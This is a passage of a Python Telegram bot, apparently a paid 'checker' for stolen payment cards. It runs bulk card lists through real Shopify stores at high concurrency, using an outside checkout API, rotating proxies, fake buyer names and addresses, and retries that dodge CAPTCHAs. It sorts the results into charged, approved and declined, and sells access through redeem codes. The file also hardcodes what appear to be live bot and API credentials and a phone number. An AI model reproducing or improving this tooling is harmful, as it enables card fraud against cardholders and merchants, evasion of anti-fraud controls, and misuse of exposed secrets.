#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════╗
║  STRIPE + BRAINTREE + SHOPIFY CHECKER                ║
║  💀 PREMIUM EDITION V5 — SAVAGE UI + ENTITY ENGINE   ║
╚══════════════════════════════════════════════════════╝
"""

import asyncio
import os
import re
import json
import html as html_module
import uuid
import secrets
import logging
import aiohttp
import random
import time
import urllib.parse
from enum import Enum
from dataclasses import dataclass, field
from typing import Dict, Optional, Tuple, List, Set, Any
from datetime import datetime, timedelta
from pathlib import Path

# curl_cffi no longer needed — checkout delegated to Flask API at SHOPIFY_API_URL

from telethon import TelegramClient, events, errors
from telethon.tl.custom import Button

# ======================== CONFIGURATION ========================
BOT_TOKEN = "8765865854:AAGh5g1ZIHfXEJVU2FAFyjhl2W1WQO9kuJg"
PAYU_BOT_USERNAME = "@newpayubot"
MAX_CARDS_PER_FILE_STRIPE = 10000
MAX_CARDS_PER_FILE_BRAINTREE = 3000
MAX_CARDS_PER_FILE_SHOPIFY = 3000
DELAY_BETWEEN_CHECKS = 0.02       # 20ms between cards (was 0.05)
MESSAGE_DELAY = 0.1               # 100ms between bot messages
BOT_OWNER_ID = 8205144423
ADMINS = [BOT_OWNER_ID]
NUM_WORKERS = 50                  # OPTIMISED: increased concurrency — Hostinger 8GB can handle it, API has own limits

API_ID = 33424122
API_HASH = "b4c85089f9748bf3a33f7043c64af7c5"
PHONE_NUMBER = "+919320665632"

STORAGE_DIR = "uploads"
PROCESSED_DIR = "processed"
DATA_FILE = "users.json"
USER_STATS_FILE = "user_stats.json"
REDEEM_CODES_FILE = "redeem_codes.json"
SHOPIFY_REDEEM_CODES_FILE = "shopify_redeem_codes.json"
FORWARD_CHAT_ID = BOT_OWNER_ID

BIN_API_URL = "https://lookup.binlist.net/{}"

SHOPIFY_API_URL = "https://rail-production-77d1.up.railway.app/shopify"
SITES_FILE = "sites.txt"
PROXY_VALIDATION_TIMEOUT = 8
PROXY_VALIDATION_RETRIES = 1
SITE_CHECK_INTERVAL_HOURS = 2
PROXY_VALIDATION_CONCURRENCY = 20
CARD_CHECK_TIMEOUT = 35            # allow EU-to-US latency headroom (API's own timeout is 30s)
SITE_VALIDATION_TIMEOUT = 60     # FIX: full 60s wait for site validation
SITE_CHECK_CONCURRENCY = 10      # FIX: slightly more concurrency for faster batch
MAX_OWNER_SITES = 500            # FIX: max 500 sites allowed
SITE_HEALTH_PING_TIMEOUT = 8     # FIX: quick runtime/site-validation health ping timeout
JOB_NO_PROGRESS_TIMEOUT = 300    # FIX: auto-cancel mass job after 300s without progress

# ═══════════════ Shopify Flask API Checkout Config ═══════════════
SHOPIFY_API_TIMEOUT = 30           # Timeout for Flask API calls (API has its own 30s internal timeout)
SHOPIFY_TEST_SITE_TIMEOUT = 35     # timeout per site during /test_sites (slightly above API timeout)
SHOPIFY_WORKING_SITES_API = "https://apok-production.up.railway.app/sites/working"
SHOPIFY_MAX_SITE_AMOUNT = 15.0     # Max product price for auto-site selection
MAX_CAPTCHA_RETRIES = 2            # Auto-retry with new site on CAPTCHA
FAST_FAIL_THRESHOLD_SECS = 1.0     # Cards completing faster than this likely didn't reach payment step
# Test card for site validation (known dead, valid Luhn format)
SHOPIFY_TEST_CARD = "4111111111111111|12|2026|123"

# ═══════════════ Retry / Resilience Config ═══════════════
MAX_CARD_RETRIES = 3               # Max retries for retryable cards before marking declined
CAPTCHA_BLOCK_MINUTES = 10         # CAPTCHA sites blocked temporarily (not permanently)
SITE_TEST_RETRIES = 2              # Retries for 503/timeout during site testing
SITE_TEST_RETRY_DELAY = 5          # Seconds between site test retries
SITE_TEST_CONCURRENCY_LIMIT = 15   # Semaphore limit for concurrent site testing
PROXY_LATENCY_REFRESH_HOURS = 1    # Re-measure proxy latency every N hours

# Browser user agents for general HTTP requests

BROWSER_USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
]

EMAIL_DOMAINS = [
    "gmail.com", "yahoo.com", "outlook.com", "hotmail.com", "protonmail.com",
    "icloud.com", "aol.com", "mail.com", "yandex.com", "proton.me",
]
FIRST_NAMES = [
    "james", "john", "robert", "michael", "william", "david", "richard", "joseph",
    "thomas", "charles", "mary", "patricia", "jennifer", "linda", "elizabeth",
    "barbara", "susan", "jessica", "sarah", "karen",
]
LAST_NAMES = [
    "smith", "johnson", "williams", "brown", "jones", "garcia", "miller", "davis",
    "rodriguez", "martinez", "anderson", "taylor", "thomas", "moore", "jackson",
    "martin", "lee", "white", "harris", "clark",
]

# ═══════════════ Adaptive Throttle ═══════════════
class AdaptiveThrottle:
    """Adaptive delay that increases when errors spike, resets after quiet periods."""
    def __init__(self, base_delay: float = 0.05, reset_interval: float = 30.0):
        self.base_delay = base_delay
        self.error_count = 0
        self.last_reset = time.time()
        self.reset_interval = reset_interval

    def record_error(self):
        self.error_count += 1

    def record_success(self):
        if self.error_count > 0:
            self.error_count = max(0, self.error_count - 1)

    async def wait(self):
        now = time.time()
        if now - self.last_reset > self.reset_interval:
            self.error_count = 0
            self.last_reset = now
        if self.error_count > 5:
            delay = self.base_delay * (1 + self.error_count / 10)
            await asyncio.sleep(min(delay, 2.0))  # cap at 2s
        else:
            await asyncio.sleep(self.base_delay)


# ═══════════════ Shopify Entity Dataclasses ═══════════════
class ShopifyCheckStatus(Enum):
    CHARGED = 0
    APPROVED = 1
    DECLINED = 2
    ERROR = 3

@dataclass
class ShopifyCheckResult:
    card: str
    status: ShopifyCheckStatus = ShopifyCheckStatus.ERROR
    status_code: str = ""
    amount: str = ""
    currency: str = "USD"
    site_name: str = ""
    shop_url: str = ""
    gateway: str = "SHOPIFY-RELOADED"
    error_msg: str = ""
    retryable: bool = False
    site_dead: bool = False

@dataclass
class ShopifyAddress:
    first_name: str
    last_name: str
    address1: str
    address2: str
    city: str
    country_code: str
    zone_code: str
    postal_code: str
    phone: str

COUNTRY_ADDRESSES = {
    "US": ShopifyAddress("james", "anderson", "428 st", "apt 4B", "New York", "US", "NY", "10001", "+12125550100"),
    "US-CA": ShopifyAddress("michael", "johnson", "123 Hollywood Blvd", "Suite 100", "Los Angeles", "US", "CA", "90028", "+13235550100"),
    "US-TX": ShopifyAddress("robert", "williams", "456 Main St", "", "Houston", "US", "TX", "77002", "+17135550100"),
    "US-FL": ShopifyAddress("david", "brown", "789 Ocean Dr", "Apt 12", "Miami", "US", "FL", "33139", "+13055550100"),
    "CA": ShopifyAddress("john", "smith", "200 Kent St", "", "Ottawa", "CA", "ON", "K1A 0G9", "+16135550100"),
    "CA-BC": ShopifyAddress("william", "davis", "789 Granville St", "Floor 5", "Vancouver", "CA", "BC", "V6Z 1K9", "+16045550100"),
    "GB": ShopifyAddress("james", "wilson", "10 Downing St", "", "London", "GB", "ENG", "SW1A 2AA", "+442012345678"),
    "GB-MAN": ShopifyAddress("oliver", "martinez", "123 Deansgate", "Apt 3B", "Manchester", "GB", "ENG", "M3 4BQ", "+441619876543"),
    "AU": ShopifyAddress("thomas", "taylor", "1 George St", "", "Sydney", "AU", "NSW", "2000", "+61212345678"),
    "AU-MEL": ShopifyAddress("daniel", "anderson", "100 Collins St", "Level 10", "Melbourne", "AU", "VIC", "3000", "+61398765432"),
    "DE": ShopifyAddress("lucas", "thomas", "Friedrichstr 100", "", "Berlin", "DE", "BE", "10117", "+493012345678"),
    "DE-MUC": ShopifyAddress("felix", "schmidt", "Marienplatz 1", "", "Munich", "DE", "BY", "80331", "+49891234567"),
    "FR": ShopifyAddress("hugo", "bernard", "10 Rue de Rivoli", "", "Paris", "FR", "IDF", "75001", "+33112345678"),
    "FR-LY": ShopifyAddress("louis", "petit", "15 Rue de la Republique", "", "Lyon", "FR", "ARA", "69001", "+33487654321"),
    "NZ": ShopifyAddress("jack", "wilson", "1 Queen St", "", "Auckland", "NZ", "AUK", "1010", "+6491234567"),
    "NZ-WLG": ShopifyAddress("liam", "brown", "100 Willis St", "Floor 2", "Wellington", "NZ", "WGN", "6011", "+6449876543"),
    "IE": ShopifyAddress("sean", "murphy", "1 Grafton St", "", "Dublin", "IE", "D", "D02 Y006", "+35311234567"),
    "IE-CORK": ShopifyAddress("patrick", "kelly", "100 Patrick St", "", "Cork", "IE", "CO", "T12 XY88", "+35321456789"),
    "NL": ShopifyAddress("bas", "jansen", "Dam 1", "", "Amsterdam", "NL", "NH", "1012 JS", "+31201234567"),
    "ES": ShopifyAddress("carlos", "garcia", "Calle Mayor 1", "", "Madrid", "ES", "M", "28013", "+34912345678"),
    "IT": ShopifyAddress("marco", "rossi", "Via Roma 1", "", "Rome", "IT", "RM", "00184", "+39061234567"),
    "SE": ShopifyAddress("erik", "andersson", "Vasagatan 1", "", "Stockholm", "SE", "AB", "111 20", "+468123456"),
    "NO": ShopifyAddress("olav", "hansen", "Karl Johans gate 1", "", "Oslo", "NO", "03", "0154", "+4721234567"),
    "DK": ShopifyAddress("lars", "nielsen", "Stroget 1", "", "Copenhagen", "DK", "84", "1457", "+4531234567"),
    "FI": ShopifyAddress("jussi", "korhonen", "Mannerheimintie 1", "", "Helsinki", "FI", "18", "00100", "+35891234567"),
    "BE": ShopifyAddress("jan", "peeters", "Grote Markt 1", "", "Brussels", "BE", "BRU", "1000", "+3221234567"),
    "CH": ShopifyAddress("hans", "weber", "Bahnhofstrasse 1", "", "Zurich", "CH", "ZH", "8001", "+41441234567"),
    "AT": ShopifyAddress("markus", "gruber", "Stephansplatz 1", "", "Vienna", "AT", "9", "1010", "+4312345678"),
    "JP": ShopifyAddress("takashi", "yamamoto", "1-1-1 Marunouchi", "", "Tokyo", "JP", "13", "100-0005", "+81312345678"),
    "SG": ShopifyAddress("wei", "tan", "1 Raffles Place", "#01-01", "Singapore", "SG", "01", "048616", "+6561234567"),
    "AE": ShopifyAddress("ahmed", "al-mansouri", "Sheikh Zayed Road 1", "", "Dubai", "AE", "DU", "12345", "+97141234567"),
}

# ═══════════════ Anime UI Constants ═══════════════
ANIME_VIDEO_URL = "https://media.tenor.com/videos/2a89c8dd4569b27e4d2e8d3b9e2e4f6e/mp4"
ANIME_FRAMES = [
    "🔥 <code>⣾⣽⣻⢿⡿⣟⣯⣷  ᴅᴇᴘʟᴏʏɪɴɢ ᴄʏʙᴇʀ ᴄᴏʀᴇ...</code> 💀",
    "⚡ <code>▰▰▰▱▱▱▱▱  ʜᴀᴄᴋɪɴɢ ᴛʜᴇ ᴍᴀᴛʀɪx...</code> 🧬",
    "💎 <code>▰▰▰▰▰▱▱▱  ʟᴏᴀᴅɪɴɢ ᴋɪʟʟ ᴇɴɢɪɴᴇ...</code> 🗡️",
    "🔮 <code>▰▰▰▰▰▰▱▱  ꜱʏɴᴄɪɴɢ ᴅᴇᴀᴛʜ ʀᴀʏ...</code> ☠️",
    "🌟 <code>▰▰▰▰▰▰▰▰  ᴡᴇᴀᴘᴏɴꜱ ᴏɴʟɪɴᴇ!</code> 🔥",
    "👑 <code>█████████  ᴀʟʟ ꜱʏꜱᴛᴇᴍꜱ ɢᴏ — ʟᴇᴛ'ꜱ ʜᴜɴᴛ</code> 💀⚡",
]

# ===============================================================

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s"
)
logger = logging.getLogger(__name__)

os.makedirs(STORAGE_DIR, exist_ok=True)
os.makedirs(PROCESSED_DIR, exist_ok=True)


class CardCheckerBot:
    def __init__(self):
        self.users: Dict[int, Optional[datetime]] = {}
        self.shopify_users: Dict[int, Optional[datetime]] = {}
        self.user_stats: Dict[int, dict] = {}
        self.redeem_codes: Dict[str, Optional[datetime]] = {}
        self.shopify_redeem_codes: Dict[str, Optional[datetime]] = {}

        self.active_jobs: Dict[str, dict] = {}
        self.task_queue = asyncio.Queue()
        self.retry_queue: asyncio.Queue = asyncio.Queue()  # Retry queue for retryable cards
        self.worker_tasks: List[asyncio.Task] = []

        self.stats = {
            "total_checked": 0,
            "total_approved": 0,
            "total_charged": 0,
            "started": datetime.now().isoformat()
        }

        self.bot_client: Optional[TelegramClient] = None
        self.user_client: Optional[TelegramClient] = None

        self._processing_cards: Set[str] = set()
        self._bin_cache: Dict[str, dict] = {}
        self.start_time = datetime.now()
        self.user_upload_mode: Dict[int, Optional[str]] = {}

        self.owner_sites: List[str] = []
        self.working_sites: List[str] = []
        self.dead_sites: Set[str] = set()
        self._captcha_blocked_sites: Dict[str, float] = {}  # site -> unblock_time (epoch)
        self.site_index: int = 0
        self._sites_ready: bool = False

        self.user_proxies: Dict[int, List[str]] = {}
        self.proxy_index: Dict[int, int] = {}
        self._proxy_latency: Dict[int, List[Tuple[str, float]]] = {}  # user_id -> [(proxy, latency_ms)]
        self._proxy_latency_updated: Dict[int, float] = {}  # user_id -> last update time

        self.site_check_task: Optional[asyncio.Task] = None
        self.proxy_validation_semaphore = asyncio.Semaphore(PROXY_VALIDATION_CONCURRENCY)
        self.site_validation_semaphore = asyncio.Semaphore(SITE_CHECK_CONCURRENCY)

        self.http_session: Optional[aiohttp.ClientSession] = None

        self._last_bot_msg_time = 0
        self._bot_msg_lock = asyncio.Lock()
        self._last_user_msg_time = 0
        self._user_msg_lock = asyncio.Lock()

        # FIX: locks for thread-safe proxy and site rotation
        self._proxy_locks: Dict[int, asyncio.Lock] = {}
        self._site_lock = asyncio.Lock()

        # Adaptive throttle for error-aware backoff during mass checks
        self.throttle = AdaptiveThrottle(base_delay=DELAY_BETWEEN_CHECKS)

        # (Shopify executor removed — checkout now uses async HTTP to Flask API)

        # User amount filter preference for Shopify: "low", "medium", "high", "all" (default)
        self.user_amount_filter: Dict[int, str] = {}

        # Global amount filter for mass jobs (pre-filter sites once)
        self.current_amount_filter: str = "all"

        # Site price cache: site_url -> cheapest product price (float)
        self._site_price_cache: Dict[str, float] = {}

        # Good sites list (strict: real payment responses only)
        self.good_sites: List[str] = []

    # ═══════════════ Rate Limiting ═══════════════
    async def _rate_limit_bot(self):
        async with self._bot_msg_lock:
            now = time.time()
            diff = now - self._last_bot_msg_time
            if diff < MESSAGE_DELAY:
                await asyncio.sleep(MESSAGE_DELAY - diff)
            self._last_bot_msg_time = time.time()

    async def _rate_limit_user(self):
        async with self._user_msg_lock:
            now = time.time()
            diff = now - self._last_user_msg_time
            if diff < 0.4:
                await asyncio.sleep(0.4 - diff)
            self._last_user_msg_time = time.time()

    async def safe_send_message(self, chat_id, text, parse_mode='html', buttons=None):
        await self._rate_limit_bot()
        try:
            if buttons:
                return await self.bot_client.send_message(chat_id, text, parse_mode=parse_mode, buttons=buttons)
            else:
                return await self.bot_client.send_message(chat_id, text, parse_mode=parse_mode)
        except errors.rpcerrorlist.FloodWaitError as e:
            logger.warning(f"Flood wait {e.seconds}s")
            await asyncio.sleep(e.seconds + 1)
            if buttons:
                return await self.bot_client.send_message(chat_id, text, parse_mode=parse_mode, buttons=buttons)
            else:
                return await self.bot_client.send_message(chat_id, text, parse_mode=parse_mode)

    async def safe_edit_message(self, chat_id, msg_id, text, parse_mode='html', buttons=None):
        await self._rate_limit_bot()
        try:
            if buttons:
                return await self.bot_client.edit_message(chat_id, msg_id, text, parse_mode=parse_mode, buttons=buttons)
            else:
                return await self.bot_client.edit_message(chat_id, msg_id, text, parse_mode=parse_mode)
        except errors.rpcerrorlist.FloodWaitError as e:
            logger.warning(f"Flood wait {e.seconds}s")
            await asyncio.sleep(e.seconds + 1)
            if buttons:
                return await self.bot_client.edit_message(chat_id, msg_id, text, parse_mode=parse_mode, buttons=buttons)
            else:
                return await self.bot_client.edit_message(chat_id, msg_id, text, parse_mode=parse_mode)

    async def get_http_session(self) -> aiohttp.ClientSession:
        if self.http_session is None or self.http_session.closed:
            connector = aiohttp.TCPConnector(
                limit=0, force_close=False, keepalive_timeout=30,
                ttl_dns_cache=300, enable_cleanup_closed=True,
            )
            timeout = aiohttp.ClientTimeout(total=CARD_CHECK_TIMEOUT + 5)
            self.http_session = aiohttp.ClientSession(connector=connector, timeout=timeout)
        return self.http_session

    async def close_http_session(self):
        if self.http_session and not self.http_session.closed:
            await self.http_session.close()

    # ═══════════════ Access Control — FIX ═══════════════
    def is_user_approved(self, user_id: int) -> bool:
        if user_id in ADMINS:
            return True
        # FIX: check key existence first, then value
        if user_id not in self.users:
            return False
        exp = self.users[user_id]
        if exp is None:          # permanent access
            return True
        if exp > datetime.now():
            return True
        # expired — clean up
        del self.users[user_id]
        self.save_users()
        return False

    def is_shopify_approved(self, user_id: int) -> bool:
        if user_id in ADMINS:
            return True
        # FIX: check key existence first, then value
        if user_id not in self.shopify_users:
            return False
        exp = self.shopify_users[user_id]
        if exp is None:          # permanent access
            return True
        if exp > datetime.now():
            return True
        # expired — clean up
        del self.shopify_users[user_id]
        self.save_users()
        return False

    def has_any_access(self, user_id: int) -> bool:
        return self.is_user_approved(user_id) or self.is_shopify_approved(user_id)

    # ═══════════════ User Management ═══════════════
    def load_users(self):
        if Path(DATA_FILE).exists():
            with open(DATA_FILE, 'r') as f:
                data = json.load(f)
            for uid, exp in data.items():
                self.users[int(uid)] = datetime.fromisoformat(exp) if exp else None
        shopify_file = Path("shopify_users.json")
        if shopify_file.exists():
            with open(shopify_file, 'r') as f:
                data = json.load(f)
            for uid, exp in data.items():
                self.shopify_users[int(uid)] = datetime.fromisoformat(exp) if exp else None

    def save_users(self):
        with open(DATA_FILE, 'w') as f:
            json.dump({str(k): v.isoformat() if v else None for k, v in self.users.items()}, f)
        with open("shopify_users.json", 'w') as f:
            json.dump({str(k): v.isoformat() if v else None for k, v in self.shopify_users.items()}, f)

    def load_user_stats(self):
        if Path(USER_STATS_FILE).exists():
            with open(USER_STATS_FILE, 'r') as f:
                self.user_stats = {int(k): v for k, v in json.load(f).items()}

    def save_user_stats(self):
        with open(USER_STATS_FILE, 'w') as f:
            json.dump({str(k): v for k, v in self.user_stats.items()}, f)

    def update_user_stats(self, user_id: int, checked: int = 0, approved: int = 0, charged: int = 0):
        if user_id not in self.user_stats:
            self.user_stats[user_id] = {"total_checked": 0, "total_approved": 0, "total_charged": 0}
        self.user_stats[user_id]["total_checked"] += checked
        self.user_stats[user_id]["total_approved"] += approved
        if "total_charged" not in self.user_stats[user_id]:
            self.user_stats[user_id]["total_charged"] = 0
        self.user_stats[user_id]["total_charged"] += charged
        self.save_user_stats()

    def get_user_stats(self, user_id: int) -> dict:
        stats = self.user_stats.get(user_id, {"total_checked": 0, "total_approved": 0, "total_charged": 0})
        if "total_charged" not in stats:
            stats["total_charged"] = 0
        return stats

    async def approve_user(self, user_id: int, duration: str):
        dur = duration.lower().strip()
        if dur == "perm":
            expiry = None
        else:
            match = re.match(r"(\d+)([mhdw]|month)", dur)
            if not match:
                return False, "Invalid duration"
            val = int(match.group(1))
            unit = match.group(2)
            now = datetime.now()
            if unit == 'm':
                expiry = now + timedelta(minutes=val)
            elif unit == 'h':
                expiry = now + timedelta(hours=val)
            elif unit == 'd':
                expiry = now + timedelta(days=val)
            elif unit == 'w':
                expiry = now + timedelta(weeks=val)
            elif unit == 'month':
                expiry = now + timedelta(days=val * 30)
            else:
                return False, "Unknown unit"
        self.users[user_id] = expiry
        self.save_users()
        expiry_str = "♾ Permanent" if expiry is None else expiry.strftime("%Y-%m-%d %H:%M:%S UTC")
        try:
            await self.safe_send_message(
                user_id,
                "╔═══════════════════════╗\n"
                "║   ✅ ACCESS GRANTED   ║\n"
                "╚═══════════════════════╝\n\n"
                f"🔑 <b>Type:</b> <code>Global Access</code>\n"
                f"⏳ <b>Expires:</b> <code>{expiry_str}</code>\n\n"
                "💡 Use /start to begin"
            )
        except:
            pass
        return True, f"✅ User {user_id} approved until {expiry_str}"

    async def approve_shopify_user(self, user_id: int, duration: str):
        dur = duration.lower().strip()
        if dur == "perm":
            exp = None
        else:
            match = re.match(r"(\d+)([mhdw]|month)", dur)
            if not match:
                return False, "Invalid duration"
            val = int(match.group(1))
            unit = match.group(2)
            now = datetime.now()
            if unit == 'm':
                exp = now + timedelta(minutes=val)
            elif unit == 'h':
                exp = now + timedelta(hours=val)
            elif unit == 'd':
                exp = now + timedelta(days=val)
            elif unit == 'w':
                exp = now + timedelta(weeks=val)
            elif unit == 'month':
                exp = now + timedelta(days=val * 30)
            else:
                return False, "Unknown unit"
        self.shopify_users[user_id] = exp
        self.save_users()
        exp_str = "♾ Permanent" if exp is None else exp.strftime("%Y-%m-%d %H:%M:%S UTC")
        try:
            await self.safe_send_message(
                user_id,
                "╔═══════════════════════╗\n"
                "║  🛒 SHOPIFY ACCESS    ║\n"
                "╚═══════════════════════╝\n\n"
                f"🔑 <b>Type:</b> <code>Shopify Gateway</code>\n"
                f"⏳ <b>Expires:</b> <code>{exp_str}</code>"
            )
        except:
            pass
        return True, f"Shopify access for {user_id} until {exp_str}"

    # ═══════════════ Redeem Codes ═══════════════
    def load_redeem_codes(self):
        if Path(REDEEM_CODES_FILE).exists():
            with open(REDEEM_CODES_FILE, 'r') as f:
                data = json.load(f)
                for code, exp in data.items():
                    self.redeem_codes[code] = datetime.fromisoformat(exp) if exp else None
        if Path(SHOPIFY_REDEEM_CODES_FILE).exists():
            with open(SHOPIFY_REDEEM_CODES_FILE, 'r') as f:
                data = json.load(f)
                for code, exp in data.items():
                    self.shopify_redeem_codes[code] = datetime.fromisoformat(exp) if exp else None

    def save_redeem_codes(self):
        with open(REDEEM_CODES_FILE, 'w') as f:
            json.dump({c: e.isoformat() if e else None for c, e in self.redeem_codes.items()}, f)
        with open(SHOPIFY_REDEEM_CODES_FILE, 'w') as f:
            json.dump({c: e.isoformat() if e else None for c, e in self.shopify_redeem_codes.items()}, f)

    def generate_redeem_code(self, duration: str) -> str:
        code = secrets.token_hex(6).upper()
        dur = duration.lower().strip()
        if dur == "perm":
            expiry = None
        else:
            match = re.match(r"(\d+)([mhdw]|month)", dur)
            if not match:
                return None
            val = int(match.group(1))
            unit = match.group(2)
            now = datetime.now()
            if unit == 'm':
                expiry = now + timedelta(minutes=val)
            elif unit == 'h':
                expiry = now + timedelta(hours=val)
            elif unit == 'd':
                expiry = now + timedelta(days=val)
            elif unit == 'w':
                expiry = now + timedelta(weeks=val)
            elif unit == 'month':
                expiry = now + timedelta(days=val * 30)
            else:
                return None
        self.redeem_codes[code] = expiry
        self.save_redeem_codes()
        return code

    def generate_shopify_redeem_code(self, duration: str) -> str:
        code = "SP" + secrets.token_hex(6).upper()
        dur = duration.lower().strip()
        if dur == "perm":
            exp = None
        else:
            match = re.match(r"(\d+)([mhdw]|month)", dur)
            if not match:
                return None
            val = int(match.group(1))
            unit = match.group(2)
            now = datetime.now()
            if unit == 'm':
                exp = now + timedelta(minutes=val)
            elif unit == 'h':
                exp = now + timedelta(hours=val)
            elif unit == 'd':
                exp = now + timedelta(days=val)
            elif unit == 'w':
                exp = now + timedelta(weeks=val)
            elif unit == 'month':
                exp = now + timedelta(days=val * 30)
            else:
                return None
        self.shopify_redeem_codes[code] = exp
        self.save_redeem_codes()
        return code

    async def redeem_code(self, user_id: int, code: str) -> Tuple[bool, str]:
        code = code.strip().upper()
        if code in self.redeem_codes:
            exp = self.redeem_codes.pop(code)
            self.save_redeem_codes()
            self.users[user_id] = exp
            self.save_users()
            exp_str = "♾ Permanent" if exp is None else exp.strftime("%Y-%m-%d %H:%M:%S UTC")
            await self.safe_send_message(
                user_id,
                "╔═══════════════════════╗\n"
                "║  🎟️ CODE REDEEMED     ║\n"
                "╚═══════════════════════╝\n\n"
                f"🔑 <b>Type:</b> <code>Global Access</code>\n"
                f"⏳ <b>Until:</b> <code>{exp_str}</code>\n\n"
                "💡 Use /start to begin"
            )
            return True, "global"
        if code in self.shopify_redeem_codes:
            exp = self.shopify_redeem_codes.pop(code)
            self.save_redeem_codes()
            self.shopify_users[user_id] = exp
            self.save_users()
            exp_str = "♾ Permanent" if exp is None else exp.strftime("%Y-%m-%d %H:%M:%S UTC")
            await self.safe_send_message(
                user_id,
                "╔═══════════════════════╗\n"
                "║  🎟️ CODE REDEEMED     ║\n"
                "╚═══════════════════════╝\n\n"
                f"🔑 <b>Type:</b> <code>Shopify Access</code>\n"
                f"⏳ <b>Until:</b> <code>{exp_str}</code>\n\n"
                "💡 Use /start to begin"
            )
            return True, "shopify"
        return False, ""

    # ═══════════════ Site Management ═══════════════
    def load_owner_sites(self):
        if Path(SITES_FILE).exists():
            try:
                with open(SITES_FILE, "r") as f:
                    lines = [l.strip() for l in f if l.strip() and not l.startswith("#")]
                self.owner_sites = lines
                logger.info(f"✅ Loaded {len(self.owner_sites)} sites from {SITES_FILE}")
            except Exception as e:
                logger.error(f"❌ Failed to load sites: {e}")
                self.owner_sites = []
        else:
            self.owner_sites = []

    def save_owner_sites(self, sites: List[str]):
        # FIX: enforce 500 site limit on save
        if len(sites) > MAX_OWNER_SITES:
            logger.warning(f"⚠️ Trimming sites from {len(sites)} to {MAX_OWNER_SITES}")
            sites = sites[:MAX_OWNER_SITES]
        with open(SITES_FILE, "w") as f:
            f.write("\n".join(sites))
        self.owner_sites = sites

    # ═══════════════ Site Validation ═══════════════
    def normalize_site_url(self, url: str) -> str:
        base = (url or "").strip()
        # Strip pipe-delimited metadata (e.g. "shop.com | Gate: authorize.net | $4")
        if '|' in base:
            base = base.split('|')[0].strip()
        # Strip space-delimited metadata after domain (e.g. "shop.com Gate: authorize.net")
        if ' ' in base and not base.startswith('http'):
            base = base.split()[0].strip()
        elif ' ' in base:
            # For "https://shop.com extra stuff", parse after scheme
            parts = base.split(None, 1)
            if len(parts) > 1 and '/' not in parts[1].split('?')[0].split('#')[0]:
                base = parts[0]
        base = base.rstrip('/')
        if not base.startswith("http"):
            base = "https://" + base
        return base

    def _is_shopify_html(self, html_text: str) -> bool:
        low = (html_text or "").lower()
        shopify_markers = ["shopify.theme", "cdn.shopify.com", ".myshopify.com", "shopify-payment-button"]
        return any(marker in low for marker in shopify_markers)

    async def quick_site_health_ping(self, url: str, timeout_sec: int = SITE_HEALTH_PING_TIMEOUT) -> Tuple[bool, str]:
        base = self.normalize_site_url(url)
        session = await self.get_http_session()
        try:
            async with session.get(
                base,
                allow_redirects=True,
                timeout=aiohttp.ClientTimeout(total=timeout_sec)
            ) as resp:
                if resp.status != 200:
                    return False, f"HTTP {resp.status}"
                html = (await resp.text(errors='ignore'))[:5000]
                low = html.lower()
                closed_markers = ["password", "coming soon", "store unavailable", "shop is closed", "store closed"]
                if any(marker in low for marker in closed_markers):
                    return False, "Store closed or password protected"
                if not self._is_shopify_html(low):
                    return False, "Not a Shopify storefront"
                return True, "OK"
        except asyncio.TimeoutError:
            return False, f"Ping timeout after {timeout_sec}s"
        except Exception as e:
            return False, f"Ping error: {str(e)[:80]}"

    async def validate_single_site(self, url: str) -> bool:
        async with self.site_validation_semaphore:
            test_card = "4111111111111111|01|26|123"
            base = self.normalize_site_url(url)
            session = await self.get_http_session()
            try:
                # 1) Reachability
                async with session.get(
                    base,
                    allow_redirects=True,
                    timeout=aiohttp.ClientTimeout(total=SITE_HEALTH_PING_TIMEOUT)
                ) as home_resp:
                    if home_resp.status != 200:
                        logger.info(f"Site {url} → DEAD (HTTP {home_resp.status})")
                        return False
                    html = await home_resp.text(errors='ignore')
                    low_html = html.lower()

                # 2) Shopify markers
                if not self._is_shopify_html(low_html):
                    logger.info(f"Site {url} → DEAD (not a Shopify store)")
                    return False

                # 3) Store open checks
                blocked_markers = [
                    "password", "coming soon", "store unavailable",
                    "shop is closed", "store closed", "not found"
                ]
                if any(marker in low_html for marker in blocked_markers):
                    logger.info(f"Site {url} → DEAD (store blocked/closed)")
                    return False

                # 4) Product existence checks
                has_products = False
                products_url = f"{base}/products.json?limit=1"
                try:
                    async with session.get(
                        products_url,
                        timeout=aiohttp.ClientTimeout(total=SITE_HEALTH_PING_TIMEOUT)
                    ) as products_resp:
                        if products_resp.status == 200:
                            products_json = await products_resp.json(content_type=None)
                            plist = products_json.get("products", []) if isinstance(products_json, dict) else []
                            has_products = isinstance(plist, list) and len(plist) > 0
                except Exception:
                    has_products = False

                if not has_products:
                    collections_url = f"{base}/collections"
                    try:
                        async with session.get(
                            collections_url,
                            allow_redirects=True,
                            timeout=aiohttp.ClientTimeout(total=SITE_HEALTH_PING_TIMEOUT)
                        ) as collections_resp:
                            if collections_resp.status == 200:
                                collections_html = await collections_resp.text(errors='ignore')
                                low_col = collections_html.lower()
                                has_products = (
                                    "shopify-section-collection" in low_col
                                    or "/collections/" in low_col
                                    or "/products/" in low_col
                                )
                    except Exception:
                        has_products = False

                if not has_products:
                    logger.info(f"Site {url} → DEAD (no products/collections)")
                    return False

                # 5) Flask API gateway check
                params = {"cc": test_card, "site": base}
                async with session.get(
                    SHOPIFY_API_URL,
                    params=params,
                    timeout=aiohttp.ClientTimeout(total=SITE_VALIDATION_TIMEOUT)
                ) as resp:
                    if resp.status != 200:
                        logger.info(f"Site {url} → DEAD (API HTTP {resp.status})")
                        return False

                    try:
                        data = await resp.json()
                    except Exception:
                        raw = await resp.text()
                        raw_lower = raw.lower().strip()
                        if not raw_lower:
                            logger.info(f"Site {url} → DEAD (empty API response)")
                            return False
                        # Legacy text-based check
                        working_markers = [
                            "declined", "card_declined", "do_not_honor",
